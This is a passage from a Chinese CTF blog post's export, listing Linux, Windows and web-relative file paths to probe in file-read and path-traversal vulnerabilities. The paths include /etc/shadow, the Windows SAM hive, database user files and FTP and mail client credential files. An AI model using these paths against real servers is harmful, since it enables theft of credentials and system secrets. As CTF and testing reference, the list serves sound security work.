Files\\tencent\\腾讯游戏\\QQGAME\\readme.txt\nc:\\Program Files\\tencent\\QQGAME\\readme.txt\nC:\\Program Files\\StormII\\Storm.exe\n```\n\n3.网站相对路径:\n\n```\n/config.php\n../../config.php\n../config.php\n../../../config.php\n/config.inc.php\n./config.inc.php\n../../config.inc.php\n../config.inc.php\n../../../config.inc.php\n/conn.php\n./conn.php\n../../conn.php\n../conn.php\n../../../conn.php\n/conn.asp\n./conn.asp\n../../conn.asp\n../conn.asp\n../../../conn.asp\n/config.inc.php\n./config.inc.php\n../../config.inc.php\n../config.inc.php\n../../../config.inc.php\n/config/config.php\n../../config/config.php\n../config/config.php\n../../../config/config.php\n/config/config.inc.php\n./config/config.inc.php\n../../config/config.inc.php\n../config/config.inc.php\n../../../config/config.inc.php\n/config/conn.php\n./config/conn.php\n../../config/conn.php\n../config/conn.php\n../../../config/conn.php\n/config/conn.asp\n./config/conn.asp\n../../config/conn.asp\n../config/conn.asp\n../../../config/conn.asp\n/config/config.inc.php\n./config/config.inc.php\n../../config/config.inc.php\n../config/config.inc.php\n../../../config/config.inc.php\n/data/config.php\n../../data/config.php\n../data/config.php\n../../../data/config.php\n/data/config.inc.php\n./data/config.inc.php\n../../data/config.inc.php\n../data/config.inc.php\n../../../data/config.inc.php\n/data/conn.php\n./data/conn.php\n../../data/conn.php\n../data/conn.php\n../../../data/conn.php\n/data/conn.asp\n./data/conn.asp\n../../data/conn.asp\n../data/conn.asp\n../../../data/conn.asp\n/data/config.inc.php\n./data/config.inc.php\n../../data/config.inc.php\n../data/config.inc.php\n../../../data/config.inc.php\n/include/config.php\n../../include/config.php\n../include/config.php\n../../../include/config.php\n/include/config.inc.php\n./include/config.inc.php\n../../include/config.inc.php\n../include/config.inc.php\n../../../include/config.inc.php\n/include/conn.php\n./include/conn.php\n../../include/conn.php\n../include/conn.php\n../../../include/conn.php\n/include/conn.asp\n./include/conn.asp\n../../include/conn.asp\n../include/conn.asp\n../../../include/conn.asp\n/include/config.inc.php\n./include/config.inc.php\n../../include/config.inc.php\n../include/config.inc.php\n../../../include/config.inc.php\n/inc/config.php\n../../inc/config.php\n../inc/config.php\n../../../inc/config.php\n/inc/config.inc.php\n./inc/config.inc.php\n../../inc/config.inc.php\n../inc/config.inc.php\n../../../inc/config.inc.php\n/inc/conn.php\n./inc/conn.php\n../../inc/conn.php\n../inc/conn.php\n../../../inc/conn.php\n/inc/conn.asp\n./inc/conn.asp\n../../inc/conn.asp\n../inc/conn.asp\n../../../inc/conn.asp\n/inc/config.inc.php\n./inc/config.inc.php\n../../inc/config.inc.php\n../inc/config.inc.php\n../../../inc/config.inc.php\n/index.php\n./index.php\n../../index.php\n../index.php\n../../../index.php\n/index.asp\n./index.asp\n../../index.asp\n../index.asp\n../../../index.asp\n```","source":"_posts/文件读取漏洞路径收集.md","raw":"---\ntitle: 文件读取漏洞路径收集\ndate: {{ date }}\ntop: false\ncover: false\npassword:\ntoc: true\nmathjax: true\nsummary:\ntags: CTF\ncategories: CTF\n---\n\n# 文件读取漏洞路径收集\n\n```\n/etc/passwd\n/etc/shadow\n/etc/issue\n/etc/fstab\n/etc/host.conf\n/etc/motd\n/etc/ld.so.conf\n/etc/sysconfig/network-scripts/ifcfg-eth0\n/etc/sysconfig/network-scripts/ifcfg-eth1\n/var/www/htdocs/index.php\n/var/www/conf/httpd.conf\n/var/www/htdocs/index.html\n/var/httpd/conf/php.ini\n/var/httpd/htdocs/index.php\n/var/httpd/conf/httpd.conf\n/var/httpd/htdocs/index.html\n/var/httpd/conf/php.ini\n/var/www/index.html\n/var/www/index.php\n/opt/www/conf/httpd.conf\n/opt/www/htdocs/index.php\n/opt/www/htdocs/index.html\n/usr/local/apache/htdocs/index.html\n/usr/local/apache/htdocs/index.php\n/usr/local/apache2/htdocs/index.html\n/usr/local/apache2/htdocs/index.php\n/usr/local/httpd2.2/htdocs/index.php\n/usr/local/httpd2.2/htdocs/index.html\n/tmp/apache/htdocs/index.html\n/tmp/apache/htdocs/index.php\n/etc/httpd/htdocs/index.php\n/etc/httpd/conf/httpd.conf\n/etc/httpd/htdocs/index.html\n/www/php/php.ini\n/www/php4/php.ini\n/www/php5/php.ini\n/www/conf/httpd.conf\n/www/htdocs/index.php\n/www/htdocs/index.html\n\n/usr/local/httpd/conf/httpd.conf\n/apache/apache/conf/httpd.conf\n/apache/apache2/conf/httpd.conf\n/etc/apache/apache.conf\n/etc/apache2/apache.conf\n/etc/apache/httpd.conf\n/etc/apache2/httpd.conf\n/etc/apache2/vhosts.d/00_default_vhost.conf\n/etc/apache2/sites-available/default\n\n/etc/phpmyadmin/config.inc.php\n/etc/mysql/my.cnf\n/etc/httpd/conf.d/php.conf\n/etc/httpd/conf.d/httpd.conf\n\n/etc/httpd/logs/error_log\n/etc/httpd/logs/error.log\n/etc/httpd/logs/access_log\n/etc/httpd/logs/access.log\n/home/apache/conf/httpd.conf\n/home/apache2/conf/httpd.conf\n\n/var/log/apache/error_log\n/var/log/apache/error.log\n/var/log/apache/access_log\n/var/log/apache/access.log\n/var/log/apache2/error_log\n/var/log/apache2/error.log\n/var/log/apache2/access_log\n/var/log/apache2/access.log\n/var/www/logs/error_log\n/var/www/logs/error.log\n/var/www/logs/access_log\n/var/www/logs/access.log\n/usr/local/apache/logs/error_log\n/usr/local/apache/logs/error.log\n/usr/local/apache/logs/access_log\n/usr/local/apache/logs/access.log\n\n/var/log/error_log\n/var/log/error.log\n/var/log/access_log\n/var/log/access.log\n\n/usr/local/apache/logs/access_logaccess_log.old\n/usr/local/apache/logs/error_logerror_log.old\n\n/etc/php.ini\n/bin/php.ini\n/etc/init.d/httpd\n/etc/init.d/mysql\n\n/etc/httpd/php.ini\n/usr/lib/php.ini\n/usr/lib/php/php.ini\n/usr/local/etc/php.ini\n/usr/local/lib/php.ini\n/usr/local/php/lib/php.ini\n/usr/local/php4/lib/php.ini\n/usr/local/php4/php.ini\n/usr/local/php4/lib/php.ini\n/usr/local/php5/lib/php.ini\n/usr/local/php5/etc/php.ini\n/usr/local/php5/php5.ini\n/usr/local/apache/conf/php.ini\n\n/usr/local/apache/conf/httpd.conf\n/usr/local/apache2/conf/httpd.conf\n\n/usr/local/apache2/conf/php.ini\n/etc/php4.4/fcgi/php.ini\n/etc/php4/apache/php.ini\n/etc/php4/apache2/php.ini\n/etc/php5/apache/php.ini\n/etc/php5/apache2/php.ini\n/etc/php/php.ini\n/etc/php/php4/php.ini\n/etc/php/apache/php.ini\n/etc/php/apache2/php.ini\n/web/conf/php.ini\n/usr/local/Zend/etc/php.ini\n/opt/xampp/etc/php.ini\n/var/local/www/conf/php.ini\n/var/local/www/conf/httpd.conf\n/etc/php/cgi/php.ini\n/etc/php4/cgi/php.ini\n/etc/php5/cgi/php.ini\n\n/php5/php.ini\n/php4/php.ini\n/php/php.ini\n/PHP/php.ini\n\n/apache/php/php.ini\n\n/xampp/apache/bin/php.ini\n/xampp/apache/conf/httpd.conf\n/NetServer/bin/stable/apache/php.ini\n/home2/bin/stable/apache/php.ini\n\n/home/bin/stable/apache/php.ini\n\n/var/log/mysql/mysql-bin.log\n/var/log/mysql.log\n/var/log/mysqlderror.log\n/var/log/mysql/mysql.log\n/var/log/mysql/mysql-slow.log\n/var/mysql.log\n\n/var/lib/mysql/my.cnf\n/usr/local/mysql/my.cnf\n/usr/local/mysql/bin/mysql\n/etc/mysql/my.cnf\n/etc/my.cnf\n\n/usr/local/cpanel/logs\n/usr/local/cpanel/logs/stats_log\n/usr/local/cpanel/logs/access_log\n/usr/local/cpanel/logs/error_log\n/usr/local/cpanel/logs/license_log\n/usr/local/cpanel/logs/login_log\n/usr/local/cpanel/logs/stats_log\n/usr/local/share/examples/php4/php.ini\n/usr/local/share/examples/php/php.ini\n```\n\n1.LINUX常见路径：\n\n```\n/etc/passwd\n/etc/shadow\n/etc/fstab\n/etc/host.conf\n/etc/motd\n/etc/ld.so.conf\n/var/www/htdocs/index.php\n/var/www/conf/httpd.conf\n/var/www/htdocs/index.html\n/var/httpd/conf/php.ini\n/var/httpd/htdocs/index.php\n/var/httpd/conf/httpd.conf\n/var/httpd/htdocs/index.html\n/var/httpd/conf/php.ini\n/var/www/index.html\n/var/www/index.php\n/opt/www/conf/httpd.conf\n/opt/www/htdocs/index.php\n/opt/www/htdocs/index.html\n/usr/local/apache/htdocs/index.html\n/usr/local/apache/htdocs/index.php\n/usr/local/apache2/htdocs/index.html\n/usr/local/apache2/htdocs/index.php\n/usr/local/httpd2.2/htdocs/index.php\n/usr/local/httpd2.2/htdocs/index.html\n/tmp/apache/htdocs/index.html\n/tmp/apache/htdocs/index.php\n/etc/httpd/htdocs/index.php\n/etc/httpd/conf/httpd.conf\n/etc/httpd/htdocs/index.html\n/www/php/php.ini\n/www/php4/php.ini\n/www/php5/php.ini\n/www/conf/httpd.conf\n/www/htdocs/index.php\n/www/htdocs/index.html\n/usr/local/httpd/conf/httpd.conf\n/apache/apache/conf/httpd.conf\n/apache/apache2/conf/httpd.conf\n/etc/apache/apache.conf\n/etc/apache2/apache.conf\n/etc/apache/httpd.conf\n/etc/apache2/httpd.conf\n/etc/apache2/vhosts.d/00_default_vhost.conf\n/etc/apache2/sites-available/default\n/etc/phpmyadmin/config.inc.php\n/etc/mysql/my.cnf\n/etc/httpd/conf.d/php.conf\n/etc/httpd/conf.d/httpd.conf\n/etc/httpd/logs/error_log\n/etc/httpd/logs/error.log\n/etc/httpd/logs/access_log\n/etc/httpd/logs/access.log\n/home/apache/conf/httpd.conf\n/home/apache2/conf/httpd.conf\n/var/log/apache/error_log\n/var/log/apache/error.log\n/var/log/apache/access_log\n/var/log/apache/access.log\n/var/log/apache2/error_log\n/var/log/apache2/error.log\n/var/log/apache2/access_log\n/var/log/apache2/access.log\n/var/www/logs/error_log\n/var/www/logs/error.log\n/var/www/logs/access_log\n/var/www/logs/access.log\n/usr/local/apache/logs/error_log\n/usr/local/apache/logs/error.log\n/usr/local/apache/logs/access_log\n/usr/local/apache/logs/access.log\n/var/log/error_log\n/var/log/error.log\n/var/log/access_log\n/var/log/access.log\n/usr/local/apache/logs/access_logaccess_log.old\n/usr/local/apache/logs/error_logerror_log.old\n/etc/php.ini\n/bin/php.ini\n/etc/init.d/httpd\n/etc/init.d/mysql\n/etc/httpd/php.ini\n/usr/lib/php.ini\n/usr/lib/php/php.ini\n/usr/local/etc/php.ini\n/usr/local/lib/php.ini\n/usr/local/php/lib/php.ini\n/usr/local/php4/lib/php.ini\n/usr/local/php4/php.ini\n/usr/local/php4/lib/php.ini\n/usr/local/php5/lib/php.ini\n/usr/local/php5/etc/php.ini\n/usr/local/php5/php5.ini\n/usr/local/apache/conf/php.ini\n/usr/local/apache/conf/httpd.conf\n/usr/local/apache2/conf/httpd.conf\n/usr/local/apache2/conf/php.ini\n/etc/php4.4/fcgi/php.ini\n/etc/php4/apache/php.ini\n/etc/php4/apache2/php.ini\n/etc/php5/apache/php.ini\n/etc/php5/apache2/php.ini\n/etc/php/php.ini\n/etc/php/php4/php.ini\n/etc/php/apache/php.ini\n/etc/php/apache2/php.ini\n/web/conf/php.ini\n/usr/local/Zend/etc/php.ini\n/opt/xampp/etc/php.ini\n/var/local/www/conf/php.ini\n/var/local/www/conf/httpd.conf\n/etc/php/cgi/php.ini\n/etc/php4/cgi/php.ini\n/etc/php5/cgi/php.ini\n/php5/php.ini\n/php4/php.ini\n/php/php.ini\n/PHP/php.ini\n/apache/php/php.ini\n/xampp/apache/bin/php.ini\n/xampp/apache/conf/httpd.conf\n/NetServer/bin/stable/apache/php.ini\n/home2/bin/stable/apache/php.ini\n/home/bin/stable/apache/php.ini\n/var/log/mysql/mysql-bin.log\n/var/log/mysql.log\n/var/log/mysqlderror.log\n/var/log/mysql/mysql.log\n/var/log/mysql/mysql-slow.log\n/var/mysql.log\n/var/lib/mysql/my.cnf\n/usr/local/mysql/my.cnf\n/usr/local/mysql/bin/mysql\n/etc/mysql/my.cnf\n/etc/my.cnf\n/usr/local/cpanel/logs\n/usr/local/cpanel/logs/stats_log\n/usr/local/cpanel/logs/access_log\n/usr/local/cpanel/logs/error_log\n/usr/local/cpanel/logs/license_log\n/usr/local/cpanel/logs/login_log\n/usr/local/cpanel/logs/stats_log\n/usr/local/share/examples/php4/php.ini\n/usr/local/share/examples/php/php.ini\n```\n\n2..windows常见路径（可以将c盘换成d,e盘,比如星外虚拟主机跟华众得,一般都放在d盘）\n\n```\nc:\\windows\\php.ini\nc:\\boot.ini\nc:\\1.txt\nc:\\a.txt\n\nc:\\CMailServer\\config.ini\nc:\\CMailServer\\CMailServer.exe\nc:\\CMailServer\\WebMail\\index.asp\nc:\\program files\\CMailServer\\CMailServer.exe\nc:\\program files\\CMailServer\\WebMail\\index.asp\nC:\\WinWebMail\\SysInfo.ini\nC:\\WinWebMail\\Web\\default.asp\nC:\\WINDOWS\\FreeHost32.dll\nC:\\WINDOWS\\7i24iislog4.exe\nC:\\WINDOWS\\7i24tool.exe\n\nc:\\hzhost\\databases\\url.asp\n\nc:\\hzhost\\hzclient.exe\nC:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\7i24虚拟主机管理平台\\自动设置[受控端].lnk\n\nC:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\Serv-U\\Serv-U Administrator.lnk\nC:\\WINDOWS\\web.config\nc:\\web\\index.html\nc:\\www\\index.html\nc:\\WWWROOT\\index.html\nc:\\website\\index.html\nc:\\web\\index.asp\nc:\\www\\index.asp\nc:\\wwwsite\\index.asp\nc:\\WWWROOT\\index.asp\nc:\\web\\index.php\nc:\\www\\index.php\nc:\\WWWROOT\\index.php\nc:\\WWWsite\\index.php\nc:\\web\\default.html\nc:\\www\\default.html\nc:\\WWWROOT\\default.html\nc:\\website\\default.html\nc:\\web\\default.asp\nc:\\www\\default.asp\nc:\\wwwsite\\default.asp\nc:\\WWWROOT\\default.asp\nc:\\web\\default.php\nc:\\www\\default.php\nc:\\WWWROOT\\default.php\nc:\\WWWsite\\default.php\nC:\\Inetpub\\wwwroot\\pagerror.gif\nc:\\windows\\notepad.exe\nc:\\winnt\\notepad.exe\nC:\\Program Files\\Microsoft Office\\OFFICE10\\winword.exe\nC:\\Program Files\\Microsoft Office\\OFFICE11\\winword.exe\nC:\\Program Files\\Microsoft Office\\OFFICE12\\winword.exe\nC:\\Program Files\\Internet Explorer\\IEXPLORE.EXE\nC:\\Program Files\\winrar\\rar.exe\nC:\\Program Files\\360\\360Safe\\360safe.exe\nC:\\Program Files\\360Safe\\360safe.exe\nC:\\Documents and Settings\\Administrator\\Application Data\\360Safe\\360Examine\\360Examine.log\nc:\\ravbin\\store.ini\nc:\\rising.ini\nC:\\Program Files\\Rising\\Rav\\RsTask.xml\nC:\\Documents and Settings\\All Users\\Start Menu\\desktop.ini\nC:\\Documents and Settings\\Administrator\\My Documents\\Default.rdp\nC:\\Documents and Settings\\Administrator\\Cookies\\index.dat\nC:\\Documents and Settings\\Administrator\\My Documents\\新建 文本文档.txt\nC:\\Documents and Settings\\Administrator\\桌面\\新建 文本文档.txt\nC:\\Documents and Settings\\Administrator\\My Documents\\1.txt\nC:\\Documents and Settings\\Administrator\\桌面\\1.txt\nC:\\Documents and Settings\\Administrator\\My Documents\\a.txt\nC:\\Documents and Settings\\Administrator\\桌面\\a.txt\nC:\\Documents and Settings\\All Users\\Documents\\My Pictures\\Sample Pictures\\Blue hills.jpg\nE:\\Inetpub\\wwwroot\\aspnet_client\\system_web\\1_1_4322\\SmartNav.htm\nC:\\Program Files\\RhinoSoft.com\\Serv-U\\Version.txt\nC:\\Program Files\\RhinoSoft.com\\Serv-U\\ServUDaemon.ini\nC:\\Program Files\\Symantec\\SYMEVENT.INF\nC:\\Program Files\\Microsoft SQL Server\\80\\Tools\\Binn\\sqlmangr.exe\nC:\\Program Files\\Microsoft SQL Server\\MSSQL\\Data\\master.mdf\nC:\\Program Files\\Microsoft SQL Server\\MSSQL.1\\MSSQL\\Data\\master.mdf\nC:\\Program Files\\Microsoft SQL Server\\MSSQL.2\\MSSQL\\Data\\master.mdf\nC:\\Program Files\\Microsoft SQL Server\\80\\Tools\\HTML\\database.htm\nC:\\Program Files\\Microsoft SQL Server\\MSSQL\\README.TXT\nC:\\Program Files\\Microsoft SQL Server\\90\\Tools\\Bin\\DdsShapes.dll\nC:\\Program Files\\Microsoft SQL Server\\MSSQL\\sqlsunin.ini\nC:\\MySQL\\MySQL Server 5.0\\my.ini\nC:\\Program Files\\MySQL\\MySQL Server 5.0\\my.ini\nC:\\Program Files\\MySQL\\MySQL Server 5.0\\data\\mysql\\user.frm\nC:\\Program Files\\MySQL\\MySQL Server 5.0\\COPYING\nC:\\Program Files\\MySQL\\MySQL Server 5.0\\share\\mysql_fix_privilege_tables.sql\nC:\\Program Files\\MySQL\\MySQL Server 4.1\\bin\\mysql.exe\nc:\\MySQL\\MySQL Server 4.1\\bin\\mysql.exe\nc:\\MySQL\\MySQL Server 4.1\\data\\mysql\\user.frm\nC:\\Program Files\\Oracle\\oraconfig\\Lpk.dll\nC:\\WINDOWS\\Microsoft.NET\\Framework\\v2.0.50727\\aspnet_state.exe\nC:\\WINDOWS\\system32\\inetsrv\\w3wp.exe\nC:\\WINDOWS\\system32\\inetsrv\\inetinfo.exe\nC:\\WINDOWS\\system32\\inetsrv\\MetaBase.xml\nC:\\WINDOWS\\system32\\inetsrv\\iisadmpwd\\achg.asp\nC:\\WINDOWS\\system32\\config\\default.LOG\nC:\\WINDOWS\\system32\\config\\sam\nC:\\WINDOWS\\system32\\config\\system\nc:\\CMailServer\\config.ini\nc:\\program files\\CMailServer\\config.ini\nc:\\tomcat6\\tomcat6\\bin\\version.sh\nc:\\tomcat6\\bin\\version.sh\nc:\\tomcat\\bin\\version.sh\nc:\\program files\\tomcat6\\bin\\version.sh\nC:\\Program Files\\Apache Software Foundation\\Tomcat 6.0\\bin\\version.sh\nc:\\Program Files\\Apache Software Foundation\\Tomcat 6.0\\logs\\isapi_redirect.log\nc:\\Apache2\\Apache2\\bin\\Apache.exe\nc:\\Apache2\\bin\\Apache.exe\nc:\\Apache2\\php\\license.txt\nC:\\Program Files\\Apache Group\\Apache2\\bin\\Apache.exe\n/usr/local/tomcat5527/bin/version.sh\n/usr/share/tomcat6/bin/startup.sh\n/usr/tomcat6/bin/startup.sh\nc:\\Program Files\\QQ2007\\qq.exe\nc:\\Program Files\\Tencent\\qq\\User.db\nc:\\Program Files\\Tencent\\qq\\qq.exe\nc:\\Program Files\\Tencent\\qq\\bin\\qq.exe\nc:\\Program Files\\Tencent\\qq2009\\qq.exe\nc:\\Program Files\\Tencent\\qq2008\\qq.exe\nc:\\Program Files\\Tencent\\qq2010\\bin\\qq.exe\nc:\\Program Files\\Tencent\\qq\\Users\\All Users\\Registry.db\nC:\\Program Files\\Tencent\\TM\\TMDlls\\QQZip.dll\nc:\\Program Files\\Tencent\\Tm\\Bin\\Txplatform.exe\nc:\\Program Files\\Tencent\\RTXServer\\AppConfig.xml\nC:\\Program Files\\Foxmal\\Foxmail.exe\nC:\\Program Files\\Foxmal\\accounts.cfg\nC:\\Program Files\\tencent\\Foxmal\\Foxmail.exe\nC:\\Program Files\\tencent\\Foxmal\\accounts.cfg\nC:\\Program Files\\LeapFTP 3.0\\LeapFTP.exe\nC:\\Program Files\\LeapFTP\\LeapFTP.exe\nc:\\Program Files\\GlobalSCAPE\\CuteFTP Pro\\cftppro.exe\nc:\\Program Files\\GlobalSCAPE\\CuteFTP Pro\\notes.txt\nC:\\Program Files\\FlashFXP\\FlashFXP.ini\nC:\\Program Files\\FlashFXP\\flashfxp.exe\nc:\\Program Files\\Oracle\\bin\\regsvr32.exe\nc:\\Program Files\\腾讯游戏\\QQGAME\\readme.txt\nc:\\Program Files\\tencent\\腾讯游戏\\QQGAME\\readme.txt\nc:\\Program Files\\tencent\\QQGAME\\readme.txt\nC:\\Program Files\\StormII\\Storm.exe\n```\n\n3.网站相对路径:\n\n```\n/config.php\n../../config.php\n../config.php\n../../../config.php\n/config.inc.php\n./config.inc.php\n../../config.inc.php\n../config.inc.php\n../../../config.inc.php\n/conn.php\n./conn.php\n../../conn.php\n../conn.php\n../../../conn.php\n/conn.asp\n./conn.asp\n../../conn.asp\n../conn.asp\n../../../conn.asp\n/config.inc.php\n./config.inc.php\n../../config.inc.php\n../config.inc.php\n../../../config.inc.php\n/config/config.php\n../../config/config.php\n../config/config.php\n../../../config/config.php\n/config/config.inc.php\n./config/config.inc.php\n../../config/config.inc.php\n../config/config.inc.php\n../../../config/config.inc.php\n/config/conn.php\n./config/conn.php\n../../config/conn.php\n../config/conn.php\n../../../config/conn.php\n/config/conn.asp\n./config/conn.asp\n../../config/conn.asp\n../config/conn.asp\n../../../config/conn.asp\n/config/config.inc.php\n./config/config.inc.php\n../../config/config.inc.php\n../config/config.inc.php\n../../../config/config.inc.php\n/data/config.php\n../../data/config.php\n../data/config.php\n../../../data/config.php\n/data/config.inc.php\n./data/config.inc.php\n../../data/config.inc.php\n../data/config.inc.php\n../../../data/config.inc.php\n/data/conn.php\n./data/conn.php\n../../data/conn.php\n../data/conn.php\n../../../data/conn.php\n/data/conn.asp\n./data/conn.asp\n../../data/conn.asp\n../data/conn.asp\n../../../data/conn.asp\n/data/config.inc.php\n./data/config.inc.php\n../../data/config.inc.php\n../data/config.inc.php\n../../../data/config.inc.php\n/include/config.php\n../../include/config.php\n../include/config.php\n../../../include/config.php\n/include/config.inc.php\n./include/config.inc.php\n../../include/config.inc.php\n../include/config.inc.php\n../../../include/config.inc.php\n/include/conn.php\n./include/conn.php\n../../include/conn.php\n../include/conn.php\n../../../include/conn.php\n/include/conn.asp\n./include/conn.asp\n../../include/conn.asp\n../include/conn.asp\n../../../include/conn.asp\n/include/config.inc.php\n./include/config.inc.php\n../../include/config.inc.php\n../include/config.inc.php\n../../../include/config.inc.php\n/inc/config.php\n../../inc/config.php\n../inc/config.php\n../../../inc/config.php\n/inc/config.inc.php\n./inc/config.inc.php\n../../inc/config.inc.php\n../inc/config.inc.php\n../../../inc/config.inc.php\n/inc/conn.php\n./inc/conn.php\n../../inc/conn.php\n../inc/conn.php\n../../../inc/conn.php\n/inc/conn.asp\n./inc/conn.asp\n../../inc/conn.asp\n../inc/conn.asp\n../../../inc/conn.asp\n/inc/config.inc.php\n./inc/config.inc.php\n../../inc/config.inc.php\n../inc/config.inc.php\n../../../inc/config.inc.php\n/index.php\n./index.php\n../../index.php\n../index.php\n../../../index.php\n/index.asp\n./index.asp\n../../index.asp\n../index.asp\n../../../index.asp\n```","slug":"文件读取漏洞路径收集","published":1,"updated":"2021-07-27T03:41:57.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cktfnuyer002ht8opdm0h6p95","content":"<h1 id=\"文件读取漏洞路径收集\"><a href=\"#文件读取漏洞路径收集\" class=\"headerlink\" title=\"文件读取漏洞路径收集\"></a>文件读取漏洞路径收集</h1><pre><code>/etc/passwd\n/etc/shadow\n/etc/issue\n/etc/fstab\n/etc/host.conf\n/etc/motd\n/etc/ld.so.conf\n/etc/sysconfig/network-scripts/ifcfg-eth0\n/etc/sysconfig/network-scripts/ifcfg-eth1\n/var/www/htdocs/index.php\n/var/www/conf/httpd.conf\n/var/www/htdocs/index.html\n/var/httpd/conf/php.ini\n/var/httpd/htdocs/index.php\n/var/httpd/conf/httpd.conf\n/var/httpd/htdocs/index.html\n/var/httpd/conf/php.ini\n/var/www/index.html\n/var/www/index.php\n/opt/www/conf/httpd.conf\n/opt/www/htdocs/index.php\n/opt/www/htdocs/index.html\n/usr/local/apache/htdocs/index.html\n/usr/local/apache/htdocs/index.php\n/usr/local/apache2/htdocs/index.html\n/usr/local/apache2/htdocs/index.php\n/usr/local/httpd2.2/htdocs/index.php\n/usr/local/httpd2.2/htdocs/index.html\n/tmp/apache/htdocs/index.html\n/tmp/apache/htdocs/index.php\n/etc/httpd/htdocs/index.php\n/etc/httpd/conf/httpd.conf\n/etc/httpd/htdocs/index.html\n/www/php/php.ini\n/www/php4/php.ini\n/www/php5/php.ini\n/www/conf/httpd.conf\n/www/htdocs/index.php\n/www/htdocs/index.html\n\n/usr/local/httpd/conf/httpd.conf\n/apache/apache/conf/httpd.conf\n/apache/apache2/conf/httpd.conf\n/etc/apache/apache.conf\n/etc/apache2/apache.conf\n/etc/apache/httpd.conf\n/etc/apache2/httpd.conf\n/etc/apache2/vhosts.d/00_default_vhost.conf\n/etc/apache2/sites-available/default\n\n/etc/phpmyadmin/config.inc.php\n/etc/mysql/my.cnf\n/etc/httpd/conf.d/php.conf\n/etc/httpd/conf.d/httpd.conf\n\n/etc/httpd/logs/error_log\n/etc/httpd/logs/error.log\n/etc/httpd/logs/access_log\n/etc/httpd/logs/access.log\n/home/apache/conf/httpd.conf\n/home/apache2/conf/httpd.conf\n\n/var/log/apache/error_log\n/var/log/apache/error.log\n/var/log/apache/access_log\n/var/log/apache/access.log\n/var/log/apache2/error_log\n/var/log/apache2/error.log\n/var/log/apache2/access_log\n/var/log/apache2/access.log\n/var/www/logs/error_log\n/var/www/logs/error.log\n/var/www/logs/access_log\n/var/www/logs/access.log\n/usr/local/apache/logs/error_log\n/usr/local/apache/logs/error.log\n/usr/local/apache/logs/access_log\n/usr/local/apache/logs/access.log\n\n/var/log/error_log\n/var/log/error.log\n/var/log/access_log\n/var/log/access.log\n\n/usr/local/apache/logs/access_logaccess_log.old\n/usr/local/apache/logs/error_logerror_log.old\n\n/etc/php.ini\n/bin/php.ini\n/etc/init.d/httpd\n/etc/init.d/mysql\n\n/etc/httpd/php.ini\n/usr/lib/php.ini\n/usr/lib/php/php.ini\n/usr/local/etc/php.ini\n/usr/local/lib/php.ini\n/usr/local/php/lib/php.ini\n/usr/local/php4/lib/php.ini\n/usr/local/php4/php.ini\n/usr/local/php4/lib/php.ini\n/usr/local/php5/lib/php.ini\n/usr/local/php5/etc/php.ini\n/usr/local/php5/php5.ini\n/usr/local/apache/conf/php.ini\n\n/usr/local/apache/conf/httpd.conf\n/usr/local/apache2/conf/httpd.conf\n\n/usr/local/apache2/conf/php.ini\n/etc/php4.4/fcgi/php.ini\n/etc/php4/apache/php.ini\n/etc/php4/apache2/php.ini\n/etc/php5/apache/php.ini\n/etc/php5/apache2/php.ini\n/etc/php/php.ini\n/etc/php/php4/php.ini\n/etc/php/apache/php.ini\n/etc/php/apache2/php.ini\n/web/conf/php.ini\n/usr/local/Zend/etc/php.ini\n/opt/xampp/etc/php.ini\n/var/local/www/conf/php.ini\n/var/local/www/conf/httpd.conf\n/etc/php/cgi/php.ini\n/etc/php4/cgi/php.ini\n/etc/php5/cgi/php.ini\n\n/php5/php.ini\n/php4/php.ini\n/php/php.ini\n/PHP/php.ini\n\n/apache/php/php.ini\n\n/xampp/apache/bin/php.ini\n/xampp/apache/conf/httpd.conf\n/NetServer/bin/stable/apache/php.ini\n/home2/bin/stable/apache/php.ini\n\n/home/bin/stable/apache/php.ini\n\n/var/log/mysql/mysql-bin.log\n/var/log/mysql.log\n/var/log/mysqlderror.log\n/var/log/mysql/mysql.log\n/var/log/mysql/mysql-slow.log\n/var/mysql.log\n\n/var/lib/mysql/my.cnf\n/usr/local/mysql/my.cnf\n/usr/local/mysql/bin/mysql\n/etc/mysql/my.cnf\n/etc/my.cnf\n\n/usr/local/cpanel/logs\n/usr/local/cpanel/logs/stats_log\n/usr/local/cpanel/logs/access_log\n/usr/local/cpanel/logs/error_log\n/usr/local/cpanel/logs/license_log\n/usr/local/cpanel/logs/login_log\n/usr/local/cpanel/logs/stats_log\n/usr/local/share/examples/php4/php.ini\n/usr/local/share/examples/php/php.ini</code></pre><p>1.LINUX常见路径：</p>\n<pre><code>/etc/passwd\n/etc/shadow\n/etc/fstab\n/etc/host.conf\n/etc/motd\n/etc/ld.so.conf\n/var/www/htdocs/index.php\n/var/www/conf/httpd.conf\n/var/www/htdocs/index.html\n/var/httpd/conf/php.ini\n/var/httpd/htdocs/index.php\n/var/httpd/conf/httpd.conf\n/var/httpd/htdocs/index.html\n/var/httpd/conf/php.ini\n/var/www/index.html\n/var/www/index.php\n/opt/www/conf/httpd.conf\n/opt/www/htdocs/index.php\n/opt/www/htdocs/index.html\n/usr/local/apache/htdocs/index.html\n/usr/local/apache/htdocs/index.php\n/usr/local/apache2/htdocs/index.html\n/usr/local/apache2/htdocs/index.php\n/usr/local/httpd2.2/htdocs/index.php\n/usr/local/httpd2.2/htdocs/index.html\n/tmp/apache/htdocs/index.html\n/tmp/apache/htdocs/index.php\n/etc/httpd/htdocs/index.php\n/etc/httpd/conf/httpd.conf\n/etc/httpd/htdocs/index.html\n/www/php/php.ini\n/www/php4/php.ini\n/www/php5/php.ini\n/www/conf/httpd.conf\n/www/htdocs/index.php\n/www/htdocs/index.html\n/usr/local/httpd/conf/httpd.conf\n/apache/apache/conf/httpd.conf\n/apache/apache2/conf/httpd.conf\n/etc/apache/apache.conf\n/etc/apache2/apache.conf\n/etc/apache/httpd.conf\n/etc/apache2/httpd.conf\n/etc/apache2/vhosts.d/00_default_vhost.conf\n/etc/apache2/sites-available/default\n/etc/phpmyadmin/config.inc.php\n/etc/mysql/my.cnf\n/etc/httpd/conf.d/php.conf\n/etc/httpd/conf.d/httpd.conf\n/etc/httpd/logs/error_log\n/etc/httpd/logs/error.log\n/etc/httpd/logs/access_log\n/etc/httpd/logs/access.log\n/home/apache/conf/httpd.conf\n/home/apache2/conf/httpd.conf\n/var/log/apache/error_log\n/var/log/apache/error.log\n/var/log/apache/access_log\n/var/log/apache/access.log\n/var/log/apache2/error_log\n/var/log/apache2/error.log\n/var/log/apache2/access_log\n/var/log/apache2/access.log\n/var/www/logs/error_log\n/var/www/logs/error.log\n/var/www/logs/a